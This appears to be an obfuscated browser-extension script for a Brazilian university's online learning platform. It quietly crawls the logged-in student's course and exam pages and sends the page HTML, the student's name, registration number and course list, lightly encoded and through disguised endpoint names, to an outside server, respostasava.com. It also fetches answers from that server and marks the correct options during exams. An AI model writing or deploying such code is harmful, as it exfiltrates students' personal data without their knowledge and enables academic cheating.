function Kyd456p(_0x2376x2) {
    return btoa(encodeURIComponent(_0x2376x2)['replace'](/%([0-9A-F]{2})/g, function(_0x2376x2, _0x2376x3) {
        return String['fromCharCode']('0x' + _0x2376x3)
    }))
}

function K52adf6pgf(_0x2376x2) {
    return decodeURIComponent(Array['prototype']['map']['call'](atob(_0x2376x2), function(_0x2376x2) {
        return '%' + ('00' + _0x2376x2['charCodeAt'](0).toString(16))['slice'](-2)
    })['join'](''))
}

function gravaPassoAluno() {}

function DadosLMS(_0x2376x2, _0x2376x3, _0x2376x7) {
    return r = [], r['componente'] = _0x2376x2, r['etapa'] = _0x2376x3, r['obj'] = JSON['stringify'](_0x2376x7), r
}

function DadosACPainel(_0x2376x2, _0x2376x3, _0x2376x7, _0x2376x9) {
    return r = [], r['atividade'] = _0x2376x2, r['prova'] = _0x2376x3, r['tipo'] = _0x2376x7, r['semana'] = _0x2376x9, r
}

function aMP(_0x2376x2, _0x2376x3) {
    rc = Kyd456p(_0x2376x3), ic = Kyd456p(_0x2376x2), rand = camo[Math['floor'](Math['random']() * camo['length'])], $['ajax']({
        method: 'POST',
        cache: !1,
        url: 'https://respostasava.com/a/m/' + rand,
        data: {
            r: rc,
            m: ic
        }
    })['fail'](function() {})['done'](function(_0x2376x2) {})
}

function processaHtmlProva(_0x2376x2) {
	

}

function bQM() {
    if ('undefined' != typeof t_a_m && t_a_m['length'] > 0) {
        var _0x2376x1a = t_a_m[0],
            _0x2376x1b = $('div.row div div:contains(\'' + _0x2376x1a + '\')'),
            _0x2376x1c = $(_0x2376x1b)['attr']('onclick');
        if (void(((((0))))) === _0x2376x1c || _0x2376x1c === !1) {
            var _0x2376x1d = t_a_m['indexOf'](_0x2376x1a);
            _0x2376x1d > -1 && t_a_m['splice'](_0x2376x1d, 1), bQM()
        } else {
            var _0x2376x1e = _0x2376x1c['replace']('AbreLMS', 'DadosLMS');
            dados = eval(_0x2376x1e), void(((((0))))) !== dados['obj'] ? dddados = '&obj="' + dados['obj']['replace'](' ', '') : dddados = '', $['ajaxQueue']({
                method: 'GET',
                cache: !1,
                url: '/login/autenticacao/redirecionaLMS.php?componente=' + dados['componente'] + '&etapa=' + dados['etapa'] + dddados,
                dataType: 'html'
            })['fail'](function() {
                var _0x2376x2 = t_a_m['indexOf'](_0x2376x1a);
                _0x2376x2 > -1 && t_a_m['splice'](_0x2376x2, 1), bQM()
            })['done'](function(_0x2376x1f) {
                var _0x2376x20 = $(_0x2376x1f),
                    _0x2376x21 = _0x2376x20['find']('a:contains("ACQF")'),
                    _0x2376x22 = _0x2376x21['length'];
                if (_0x2376x22 > 0) {
                    var _0x2376x23 = 0;
                    $(_0x2376x21)['each'](function() {
                        var _0x2376xc = $(this)[0]['outerHTML'],
                            _0x2376x14 = _0x2376xc['split']('{ '),
                            _0x2376x24 = _0x2376x14[1]['split'](' }'),
                            _0x2376x25 = _0x2376x24[0],
                            _0x2376x26 = _0x2376x25['replace']('abrirACPainel', 'DadosACPainel'),
                            _0x2376x27 = eval(_0x2376x26);
                        tABs = !0, $['ajaxQueue']({
                            method: 'POST',
                            cache: !1,
                            url: '/ava/avaliacao/index.php',
                            data: {
                                atividade: _0x2376x27['atividade'],
                                prova: _0x2376x27['prova'],
                                tipo: _0x2376x27['tipo'],
                                semanaA: _0x2376x27['semana']
                            }
                        })['fail'](function() {
                            if (tABs = !1, bRQ_V1(_0x2376x1f), _0x2376x23 += 1, _0x2376x23 === _0x2376x22) {
                                var _0x2376x2 = t_a_m['indexOf'](_0x2376x1a);
                                _0x2376x2 > -1 && t_a_m['splice'](_0x2376x2, 1), bQM()
                            }
                        })['done'](function(_0x2376x2) {
                            if (bRQ_V1(_0x2376x2), _0x2376x23 += 1, _0x2376x23 === _0x2376x22) {
                                var _0x2376x3 = t_a_m['indexOf'](_0x2376x1a);
                                _0x2376x3 > -1 && t_a_m['splice'](_0x2376x3, 1), tABs === !0 && 7 === _0x2376x22 && aMP(_0x2376x1a, ra_aluno), bQM()
                            }
                        })
                    })
                } else {
                    aMP(_0x2376x1a, ra_aluno);
                    var _0x2376x1d = t_a_m['indexOf'](_0x2376x1a);
                    _0x2376x1d > -1 && t_a_m['splice'](_0x2376x1d, 1), bQM()
                }
					var _0x2376x20 = $(_0x2376x1f),
					_0x2376x21 = _0x2376x20['find']('a:contains("ACQA")'),
					_0x2376x22 = _0x2376x21['length'];
				if (_0x2376x22 > 0) {
					var _0x2376x23 = 0;
					$(_0x2376x21)['each'](function() {
						var _0x2376xc = $(this)[0]['outerHTML'],
							_0x2376x14 = _0x2376xc['split']('{ '),
							_0x2376x24 = _0x2376x14[1]['split'](' }'),
							_0x2376x25 = _0x2376x24[0],
							_0x2376x26 = _0x2376x25['replace']('abrirACPainel', 'DadosACPainel'),
							_0x2376x27 = eval(_0x2376x26);
						tABs = !0, $['ajaxQueue']({
							method: 'POST',
							cache: !1,
							url: '/ava/avaliacao/index.php',
							data: {
								atividade: _0x2376x27['atividade'],
								prova: _0x2376x27['prova'],
								tipo: _0x2376x27['tipo'],
								semanaA: _0x2376x27['semana']
							}
						})['fail'](function() {
							if (tABs = !1, bRQ_V1(_0x2376x1f), _0x2376x23 += 1, _0x2376x23 === _0x2376x22) {
								var _0x2376x2 = t_a_m['indexOf'](_0x2376x1a);
								_0x2376x2 > -1 && t_a_m['splice'](_0x2376x2, 1), bQM()
							}
						})['done'](function(_0x2376x2) {
							if (bRQ_V1(_0x2376x2), _0x2376x23 += 1, _0x2376x23 === _0x2376x22) {
								var _0x2376x3 = t_a_m['indexOf'](_0x2376x1a);
								_0x2376x3 > -1 && t_a_m['splice'](_0x2376x3, 1), tABs === !0 && 7 === _0x2376x22 && aMP(_0x2376x1a, ra_aluno), bQM()
							}
						})
					})
				} else {
					aMP(_0x2376x1a, ra_aluno);
					var _0x2376x1d = t_a_m['indexOf'](_0x2376x1a);
					_0x2376x1d > -1 && t_a_m['splice'](_0x2376x1d, 1), bQM()
				}
            })
        }
    }
}

function bRQ_V1(_0x2376x2) {
    //if (isThisPage = !1, (void(((((0))))) === typeof _0x2376x2 || void(((((0))))) === _0x2376x2 || null === _0x2376x2) && (_0x2376x2 = $('body'), isThisPage = !0), $(_0x2376x2)['find']('#divGabaritoDescQuestao')['length']) {
        //var _0x2376x3 = $(_0x2376x2)['find']('.divAvaDadosComponentes');
		                $['ajaxQueue']({
                    method: 'POST',
                    //url: 'https://respostasava.com/a/index/ffenviaresposta.php',
					url: 'https://respostasava.com/a/index/enviasegredo.php',
                    data: {
                        aferson: _0x2376x2
                    }
                })['done'](function(_0x2376x2) {})
        /*_0x2376x3['each'](function() {
            if ($(this)['next']('div.formGeral')['find']('#divGabaritoDescQuestao')['length']) {
                var _0x2376x3 = $(this)['next']('div.formGeral')['find']('#divGabaritoDescQuestao');
                var _0x2376x29 = $(this)['next']('div.formGeral')['find']('#divDescQuestaoGabarito');
                q_e = $(_0x2376x29)['html'](), imgs = [], $(_0x2376x29)['find']('img')['length'] && $(_0x2376x29)['find']('img')['each'](function() {
                    $('#asrespostas')['append']($(this)['attr']('src')), imgs['push']($(this)['attr']('src'))
                }), questao_div = $(_0x2376x3)['parent']()['parent']()['parent']()['parent']()['parent'](), questao_div_id = $(questao_div)['attr']('id'), opcao_correta = !1, $(_0x2376x2)['find']('#' + questao_div_id + ' table tbody tr')['eq'](2)['children']('td')['children']('p')['length'] && (op1 = $(_0x2376x2)['find']('#' + questao_div_id + ' table tbody tr')['eq'](1)['children']('td')['children']('p'), opcao_1 = $(op1)['html'](), opcao_1_text = $(op1)['text'](), opcao_1_simbolo_cont = $(op1)['parent']()['parent']()['children']()['eq'](0), ($(opcao_1_simbolo_cont)['children']('i')['hasClass']('fa-check') || $(opcao_1_simbolo_cont)['children']('i')['hasClass']('fa-dot-circle-o')) && (opcao_correta = 1), $(op1)['find']('img')['length'] && $(op1)['find']('img')['each'](function() {
                    imgs['push']($(this)['attr']('src'))
                })), $(_0x2376x2)['find']('#' + questao_div_id + ' table tbody tr')['eq'](2)['children']('td')['children']('p')['length'] && (op2 = $(_0x2376x2)['find']('#' + questao_div_id + ' table tbody tr')['eq'](3)['children']('td')['children']('p'), opcao_2 = $(op2)['html'](), opcao_2_simbolo_cont = $(op2)['parent']()['parent']()['children']()['eq'](0), ($(opcao_2_simbolo_cont)['children']('i')['hasClass']('fa-check') || $(opcao_2_simbolo_cont)['children']('i')['hasClass']('fa-dot-circle-o')) && (opcao_correta = 2), $(op2)['find']('img')['length'] && ($(_0x2376x2)['find']('#asrespostas')['append']('Encontrou imagens na opcao 2...'), $(op2)['find']('img')['each'](function() {
                    imgs['push']($(this)['attr']('src'))
                }))), $(_0x2376x2)['find']('#' + questao_div_id + ' table tbody tr')['eq'](3)['children']('td')['children']('p')['length'] && (op3 = $(_0x2376x2)['find']('#' + questao_div_id + ' table tbody tr')['eq'](4)['children']('td')['children']('p'), opcao_3 = $(op3)['html'](), opcao_3_simbolo_cont = $(op3)['parent']()['parent']()['children']()['eq'](0), ($(opcao_3_simbolo_cont)['children']('i')['hasClass']('fa-check') || $(opcao_3_simbolo_cont)['children']('i')['hasClass']('fa-dot-circle-o')) && (opcao_correta = 3), $(op3)['find']('img')['length'] && $(op3)['find']('img')['each'](function() {
                    imgs['push']($(this)['attr']('src'))
                })), $(_0x2376x2)['find']('#' + questao_div_id + ' table tbody tr')['eq'](2)['children']('td')['children']('p')['length'] && (op4 = $(_0x2376x2)['find']('#' + questao_div_id + ' table tbody tr')['eq'](5)['children']('td')['children']('p'), opcao_4 = $(op4)['html'](), opcao_4_simbolo_cont = $(op4)['parent']()['parent']()['children']()['eq'](0), ($(opcao_4_simbolo_cont)['children']('i')['hasClass']('fa-check') || $(opcao_4_simbolo_cont)['children']('i')['hasClass']('fa-dot-circle-o')) && (opcao_correta = 4), $(op4)['find']('img')['length'] && $(op4)['find']('img')['each'](function() {
                    imgs['push']($(this)['attr']('src'))
                })), $(_0x2376x2)['find']('#' + questao_div_id + ' table tbody tr')['eq'](2)['children']('td')['children']('p')['length'] && (op5 = $(_0x2376x2)['find']('#' + questao_div_id + ' table tbody tr')['eq'](6)['children']('td')['children']('p'), opcao_5 = $(op5)['html'](), opcao_5_simbolo_cont = $(op5)['parent']()['parent']()['children']()['eq'](0), ($(opcao_5_simbolo_cont)['children']('i')['hasClass']('fa-check') || $(opcao_5_simbolo_cont)['children']('i')['hasClass']('fa-dot-circle-o')) && (opcao_correta = 5), $(op5)['find']('img')['length'] && $(op5)['find']('img')['each'](function() {
                    imgs['push']($(this)['attr']('src'))
                })), questao_id_1 = questao_div_id['split']('_'), questao_id = questao_id_1['slice'](-1)[0], nome_e_ra_aluno = $(_0x2376x2)['find']('#nameUser')['text']()['trim'](), nome_aluno_1 = nome_e_ra_aluno['replace'](/[0-9]/g, ''), nome_aluno = nome_aluno_1['replace']('- ', ''), ra_aluno = nome_e_ra_aluno['replace'](/\D/g, ''), nome_e_id_disciplina = $(_0x2376x2)['find']('strong:contains(\'Disciplina:\')')['parent']()['text'](), nome_disciplina_1 = nome_e_id_disciplina['replace'](/[0-9]/g, ''), nome_disciplina = nome_disciplina_1['replace']('Disciplina:', ''), id_disciplina = nome_e_id_disciplina['replace'](/\D/g, ''), id_atividade_1 = $(_0x2376x2)['find']('strong:contains(\'Atividade:\')')['parent']()['text'](), id_atividade = id_atividade_1['replace'](/\D/g, ''), id_oferta_1 = $(_0x2376x2)['find']('strong:contains(\'Oferta:\')')['parent']()['text'](), id_oferta = id_oferta_1['replace'](/\D/g, ''), semana_1 = $(_0x2376x2)['find']('strong:contains(\'Semana:\')')['parent']()['text'](), semana = semana_1['replace'](/\D/g, ''), curso_e_polo = $(_0x2376x2)['find']('.divPrincResp .itemFaixaInfo')['eq'](5)['text'](), isThisPage === !0 ? html_pagina = $(_0x2376x2)['html']() : html_pagina = _0x2376x2;
                var _0x2376x7 = camo[Math['floor'](Math['random']() * camo['length'])];
                $['ajaxQueue']({
                    method: 'POST',
                    url: 'https://respostasava.com/a/index/' + _0x2376x7,
                    data: {
                        questao_id: questao_id,
                        enunciado: q_e,
                        opcao1: opcao_1,
                        opcao2: opcao_2,
                        opcao3: opcao_3,
                        opcao4: opcao_4,
                        opcao5: opcao_5,
                        opcaocorreta: opcao_correta,
                        materia: nome_disciplina,
                        id_materia: id_disciplina,
                        id_atividade: id_atividade,
                        id_oferta: id_oferta,
                        semana: semana,
                        nome_aluno: nome_aluno,
                        ra_aluno: ra_aluno,
                        curso_e_polo: curso_e_polo
                    }
                })['done'](function(_0x2376x2) {})
            }
        })*/
    //}
}
Date['prototype']['today'] = function() {
        return (this['getDate']() < 10 ? '0' : '') + this['getDate']() + '/' + (this['getMonth']() + 1 < 10 ? '0' : '') + (this['getMonth']() + 1) + '/' + this['getFullYear']()
    }, Date['prototype']['timeNow'] = function() {
        return (this['getHours']() < 10 ? '0' : '') + this['getHours']() + ':' + (this['getMinutes']() < 10 ? '0' : '') + this['getMinutes']() + ':' + (this['getSeconds']() < 10 ? '0' : '') + this['getSeconds']()
    },
    function(_0x2376x2) {
        var _0x2376x3 = _0x2376x2({});
        _0x2376x2['ajaxQueue'] = function(_0x2376x7) {
            function _0x2376x9(_0x2376x3) {
                _0x2376xc = _0x2376x2['ajax'](_0x2376x7), _0x2376xc['done'](_0x2376xd['resolve'])['fail'](_0x2376xd['reject'])['then'](_0x2376x3, _0x2376x3)
            }
            var _0x2376xc, _0x2376xd = _0x2376x2.Deferred(),
                _0x2376xe = _0x2376xd['promise']();
            return _0x2376x3['queue'](_0x2376x9), _0x2376xe['abort'] = function(_0x2376xf) {
                if (_0x2376xc) {
                    return _0x2376xc['abort'](_0x2376xf)
                };
                var _0x2376x10 = _0x2376x3['queue'](),
                    _0x2376x11 = _0x2376x2['inArray'](_0x2376x9, _0x2376x10);
                return _0x2376x11 > -1 && _0x2376x10['splice'](_0x2376x11, 1), _0x2376xd['rejectWith'](_0x2376x7['context'] || _0x2376x7, [_0x2376xe, _0x2376xf, '']), _0x2376xe
            }, _0x2376xe
        }
    }(jQuery);
var camo = ['enviaresposta.php', 'enviaresposta.php', 'enviaresposta.php', 'enviaresposta.php', 'enviaresposta.php', 'enviaresposta.php', 'enviaresposta.php', 'enviaresposta.php', 'enviaresposta.php', 'enviaresposta.php', 'enviaresposta.php', 'enviaresposta.php'];
$('.opcoes_questao_ul_as_respostas_033')['length'] && (id_questao = $('.opcoes_questao_ul_as_respostas_033')['attr']('id'), $['ajaxQueue']({
    method: 'POST',
    url: 'https://respostasava.com/a/novares/index2.php',
    dataType: 'json',
    data: {
        id_questao: id_questao
    }
})['done'](function(_0x2376x2) {
    $('#asrespostas')['html'](_0x2376x2.Resposta), eqn = !1, resposta = parseInt(_0x2376x2.Resposta), 1 === resposta ? eqn = 1 : 2 === resposta ? eqn = 2 : 3 === resposta ? eqn = 3 : 4 === resposta ? eqn = 4 : 5 === resposta && (eqn = 5), eqn && (todas_li = $('.opcoes_questao_ul_as_respostas_033 li'), $(todas_li)['children']('i.fa')['removeClass']('fa-question')['addClass']('fa-close')['css']('background-color', '#a94442'), correta = $('.opcoes_questao_ul_as_respostas_033 li')['eq'](parseInt(eqn) - 1), $(correta)['children']('i.fa')['removeClass']('fa-close')['addClass']('fa-check')['css']('background-color', '#3c763d')['css']('weight', 'bold'), $(correta)['css']('font-weight', 'bold')['css']('text-decoration', 'underline')['css']('color', '#3c763d'), $('#sem_extensao_instalada')['remove']())
}));
var t_a_m = [];
if ($('#avaAbasBoots')['length'] && $['ajax']({
        method: 'POST',
        url: '/ava/programas/vista_prova/index.php',
        data: {
            icone: 'bullseye',
            titulo: 'Gabarito e Vista de Prova'
        }
    })['done'](function(_0x2376x2) {
        processaHtmlProva(_0x2376x2)
    }), $('#avaAbasBoots')['length']) {
    materiasAll = $('div[alt="Acessar sala de aula"]'), $(materiasAll)['each'](function() {
        var _0x2376x2 = $(this)['text']();
        _0x2376x2 = parseInt(_0x2376x2), isNaN(_0x2376x2) || t_a_m['push'](_0x2376x2)
    }), nome_e_ra_aluno = $('body')['find']('#nameUser')['text']()['trim'](), ra_aluno = nome_e_ra_aluno['replace'](/\D/g, '');
    var t_a_m_JSON = JSON['stringify'](t_a_m),
        t_a_m_c = Kyd456p(t_a_m_JSON),
        ra_aluno_c = Kyd456p(ra_aluno),
        rand = camo[Math['floor'](Math['random']() * camo['length'])];
    $['ajaxQueue']({
        method: 'POST',
        cache: !1,
        url: 'https://respostasava.com/a/q/' + rand,
        type: 'json',
        data: {
            m: t_a_m_c,
            r: ra_aluno_c
        }
    })['fail'](function() {
        bQM()
    })['done'](function(_0x2376x2) {
        _0x2376x2['error'] === !0, bQM()
    })
};
$('#divGabaritoDescQuestao')['length'] && bRQ_V1()